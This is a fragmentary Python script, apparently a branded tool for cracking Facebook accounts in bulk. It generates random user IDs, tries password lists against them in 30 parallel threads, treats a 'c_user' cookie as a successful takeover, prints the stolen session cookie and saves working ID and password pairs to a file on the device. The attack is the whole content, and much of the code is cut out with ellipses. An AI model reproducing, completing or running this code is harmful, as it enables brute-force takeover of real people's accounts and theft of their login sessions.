...
os.system("xdg-open https://youtube.cm/shorts/OdgOtddCd88?si=P8pr8Omjw6gMyNPC")
logo = ("""                                                                                                                            
████████╗ █████╗ ███╗   ███╗ █████╗ ██╗  ██╗
╚══██╔══╝██╔══██╗████╗ ████║██╔══██╗██║ ██╔╝
   ██║   ███████║██╔████╔██║███████║█████╔╝ 
...
def v2():
    ...
    doamin = '.'
    limit = int(input('[?] ENTER YOUR CRACK LIMIT :5000 '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mANONYMOUS-MAMUN🦸\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
    ...
    # 'cookie': 'datr=X7tQZUMYv_Yq-B0DsafrY567; sb=X7tQZWQ1Z4j1RbhE83UpS8T2; m_pixel_ratio=2; dpr=2.1988937854766846; wd=360x668; fr=0jMjTUTukGIJa2u6L..BlULtf.SA.AAA.0.0.BlWNDS.AWXKzxq9QEY',
    'dpr': '2',
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                print(f"\n[COOKIE🎁] : {coki}")
                open('/sdcard/MAMUN-ISLAM/ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[MAMUN ISLAM💥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
